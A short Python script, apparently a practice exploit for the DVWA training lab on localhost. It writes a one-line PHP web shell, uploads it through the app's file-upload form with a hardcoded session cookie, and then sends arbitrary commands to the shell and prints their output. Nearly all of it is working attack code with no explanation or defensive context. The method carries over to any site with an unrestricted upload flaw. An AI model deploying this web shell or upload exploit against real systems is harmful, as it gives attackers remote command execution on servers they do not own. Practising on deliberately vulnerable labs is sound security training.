import requests
import sys


def uploadShell():
    URL = "http://127.0.0.1/DVWA/vulnerabilities/upload/"
    # Creating our web shell file which we will upload on remote server to run commands
    webshell = open("shell.php","w")                        # Create/Open file shell.php to write
    webshell.write("<?php system($_POST['command']); ?>")   # php POST method which will run the commands by posting them on the server
    webshell.close()                                        # Close the file

    # Preparing shell
    files = {
            "MAX_FILE_SIZE":(None,"100000"),
            "uploaded":open("shell.php","r"),
            "Upload":(None,"Upload"),
            }
    # Upload shell using the browser session
    request1 = session1.post(URL,cookies=cookie,files=files)


def executeCommands(command):
    URL = "http://127.0.0.1/DVWA/hackable/uploads/shell.php"  # Shell directory
    data = {"command":command}                                # Set name of command to run as "command"
    request2 = session2.post(URL,cookies=cookie, data=data)   # Run the command
    
    # If response is received
    if request2.text != -1:
        print("Worked!\n")
        print(request2.text)
        exit(0)
    # If response is not received
    else:
        print("Failed\n")


if __name__ == "__main__":
    # If command to run on remote server is not given
    if len(sys.argv) < 2:
        print("Usage: {} <command>".format(sys.argv[0]))
        exit(0)
    # If command is given
    else:
        session1 = requests.Session()
        session2 = requests.Session()
        cookie = {"PHPSESSID":"9tp4hi0m7muokdfi94sk31ji4f","security":"low"}

uploadShell()
executeCommands(sys.argv[1])                                # Argument/Command which was input
